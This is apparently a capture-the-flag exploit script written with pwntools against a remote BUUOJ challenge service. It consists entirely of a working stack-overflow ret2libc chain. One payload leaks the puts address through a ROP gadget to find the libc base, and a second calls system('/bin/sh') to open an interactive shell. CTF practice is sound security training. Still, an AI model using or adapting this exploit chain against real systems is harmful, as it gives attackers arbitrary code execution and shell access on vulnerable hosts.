from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 28947)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('./pwn')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x0000000000400843


payload = cyclic(0x10C) + p32(0x10D) + cyclic(8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
io.sendlineafter('Hack 4 fun!\n', payload)
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

# gdb.attach(io)
# pause()
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x10C) + p32(0x10D) + cyclic(8) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter('Hack 4 fun!\n', payload)
io.interactive()
